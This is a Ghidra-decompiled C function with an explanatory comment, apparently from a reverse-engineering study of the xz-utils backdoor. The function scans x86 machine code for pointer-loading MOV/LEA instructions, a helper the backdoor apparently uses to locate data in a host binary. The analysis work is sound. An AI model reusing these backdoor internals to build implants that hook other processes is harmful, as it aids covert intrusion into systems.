// /home/kali/xzre-ghidra/xzregh/100D40_find_mov_lea_instruction.c
// Function: find_mov_lea_instruction @ 0x100D40
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_mov_lea_instruction(u8 * code_start, u8 * code_end, BOOL is_64bit_operand, BOOL load_flag, dasm_ctx_t * dctx)


/*
 * AutoDoc: Scans for pointer-producing MOV/LEA instructions that use the expected memory ModRM shape.
 * Each decode must either be LEA (`0x10d`) or the MOV opcode selected by `load_flag` (`mov reg,[mem]` vs `mov [mem],reg`), and the REX.W bit must agree with `is_64bit_operand` unless the caller is searching for stores.
 * On success `dctx` remains on the instruction so pointer-chasing helpers can read back operands and addressing.
 */

#include "xzre_types.h"

BOOL find_mov_lea_instruction
               (u8 *code_start,u8 *code_end,BOOL is_64bit_operand,BOOL load_flag,dasm_ctx_t *dctx)

{
  int opcode;
  BOOL decode_ok;
  long clear_idx;
  dasm_ctx_t *zero_ctx;
  BOOL opcode_match;
  dasm_ctx_t scratch_ctx;
  
  zero_ctx = &scratch_ctx;
  for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
    *(undefined4 *)&zero_ctx->instruction = 0;
    zero_ctx = (dasm_ctx_t *)((long)&zero_ctx->instruction + 4);
  }
  if (dctx == (dasm_ctx_t *)0x0) {
    dctx = &scratch_ctx;
  }
  do {
    while( TRUE ) {
      if (code_end <= code_start) {
        return FALSE;
      }
      decode_ok = x86_dasm(dctx,code_start,code_end);
      if (decode_ok != FALSE) break;
      code_start = code_start + 1;
    }
    if ((((dctx->prefix).decoded.modrm.modrm_word & 0xff00ff00) == 0x5000000) &&
       (((((dctx->prefix).decoded.rex.rex_byte & 0x48) == 0x48) == is_64bit_operand ||
        (load_flag == FALSE)))) {
      opcode = *(int *)(dctx->opcode_window + 3);
      if (opcode == 0x10d) {
        return TRUE;
      }
      if (load_flag == FALSE) {
        opcode_match = opcode == 0x109;
      }
      else {
        opcode_match = opcode == 0x10b;
      }
      if (opcode_match) {
        return TRUE;
      }
    }
    code_start = code_start + dctx->instruction_size;
  } while( TRUE );
}

